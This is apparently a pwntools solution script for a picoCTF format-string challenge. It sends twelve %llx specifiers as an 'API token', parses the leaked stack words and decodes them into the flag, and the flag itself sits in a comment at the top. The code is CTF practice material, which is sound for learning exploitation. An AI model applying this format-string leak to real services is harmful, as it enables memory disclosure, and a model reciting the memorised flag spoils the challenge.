#!/usr/bin/env python3
#picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
#python3 solution.py

from pwn import *

format_string = "|".join(["%llx" for _ in range(0,12)])

p = remote("mercury.picoctf.net", 27912)
#p = process("./vuln")
#raw_input("attach gdb")

p.recvuntil("2) View my portfolio")
p.sendline(b'1')

p.recvuntil("What is your API token?")
p.sendline(format_string)


leaks = p.recvuntil("Portfolio")  # return bytes
leaks = leaks.decode().split('\n')   # convert byte to string
leaks = leaks[2].split('|')
print("leaked values/address: ", leaks[7], leaks[8], leaks[9], leaks[10], leaks[11]) # address where pc will jump when 'ret'

flag = (bytearray.fromhex(leaks[7]).decode()) [::-1]
flag += (bytearray.fromhex(leaks[8]).decode()) [::-1]
flag += (bytearray.fromhex(leaks[9]).decode()) [::-1]
flag += (bytearray.fromhex(leaks[10]).decode()) [::-1]
flag += (bytearray.fromhex(leaks[11][6:]).decode()) [::-1]
print("flag:", flag)

